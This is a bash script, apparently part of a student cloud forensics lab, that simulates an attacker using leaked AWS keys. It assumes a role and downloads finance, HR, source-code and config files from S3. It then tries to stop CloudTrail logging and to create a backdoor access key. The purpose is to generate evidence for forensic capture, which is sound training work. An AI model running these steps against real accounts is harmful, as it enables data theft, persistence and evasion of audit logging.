#!/bin/bash
# 3-attack.sh — simulate the attacker using leaked credentials
# Author: 7ankalis — Securinets ENIT

set +e

DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"
source ./config.env

if [ -z "${VICTIM_AK:-}" ]; then
    echo "[!] Run ./1-setup.sh first"
    exit 1
fi

echo "=================================================="
echo " Cloud Forensics — Attack Simulation"
echo "=================================================="
echo
echo "Using victim access key: $VICTIM_AK"
echo "Role: $ROLE_NAME"
echo

# Save current creds
ORIG_AK="${AWS_ACCESS_KEY_ID:-}"
ORIG_SK="${AWS_SECRET_ACCESS_KEY:-}"
ORIG_ST="${AWS_SESSION_TOKEN:-}"

# Switch to victim credentials
export AWS_ACCESS_KEY_ID="$VICTIM_AK"
export AWS_SECRET_ACCESS_KEY="$VICTIM_SK"
unset AWS_SESSION_TOKEN
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "[1/8] GetCallerIdentity — testing the key"
aws sts get-caller-identity >/dev/null
echo "      [+] Key is valid"
sleep 2

echo "[2/8] ListAttachedUserPolicies"
aws iam list-attached-user-policies --user-name "$VICTIM_USER" >/dev/null 2>&1 || true
echo "      [+] Done"
sleep 2

echo "[3/8] ListBuckets"
aws s3 ls >/dev/null
echo "      [+] Done"
sleep 2

echo "[4/8] AssumeRole as $ROLE_NAME"
ASSUME=$(aws sts assume-role \
    --role-arn "arn:aws:iam::${AWS_ACCOUNT_ID}:role/${ROLE_NAME}" \
    --role-session-name "$ROLE_SESSION_NAME")

TEMP_AK=$(echo "$ASSUME" | jq -r '.Credentials.AccessKeyId')
TEMP_SK=$(echo "$ASSUME" | jq -r '.Credentials.SecretAccessKey')
TEMP_ST=$(echo "$ASSUME" | jq -r '.Credentials.SessionToken')
echo "      [+] Assumed session: $TEMP_AK"
sleep 2

# Switch to assumed role credentials
export AWS_ACCESS_KEY_ID="$TEMP_AK"
export AWS_SECRET_ACCESS_KEY="$TEMP_SK"
export AWS_SESSION_TOKEN="$TEMP_ST"

echo "[5/8] ListObjects on internal bucket"
aws s3 ls "s3://${BUCKET_INTERNAL}/" --recursive >/dev/null
echo "      [+] Done"
sleep 2

echo "[6/8] Download sensitive objects"
aws s3 cp "s3://${BUCKET_INTERNAL}/finance/q4-forecast-2026.xlsx" /tmp/stolen-forecast.xlsx >/dev/null
aws s3 cp "s3://${BUCKET_INTERNAL}/hr/employee-salary-data.csv" /tmp/stolen-hr.csv >/dev/null
aws s3 cp "s3://${BUCKET_SOURCE}/backend/main.zip" /tmp/stolen-code.zip >/dev/null
aws s3 cp "s3://${BUCKET_SOURCE}/backend/database-config.json" /tmp/stolen-config.json >/dev/null
echo "      [+] Downloaded 4 objects"
sleep 2

echo "[7/8] Attempt to stop CloudTrail logging"
aws cloudtrail stop-logging --name "$TRAIL_NAME" 2>&1 | head -2 || true
sleep 2

echo "[8/8] Attempt to create a backdoor access key"
aws iam create-access-key --user-name backup-service 2>&1 | head -2 || true

echo
echo "=================================================="
echo " Attack simulated"
echo "=================================================="
echo
echo "Wait 5 minutes for CloudTrail to index the events."
echo
echo "Next: ./4-capture.sh"
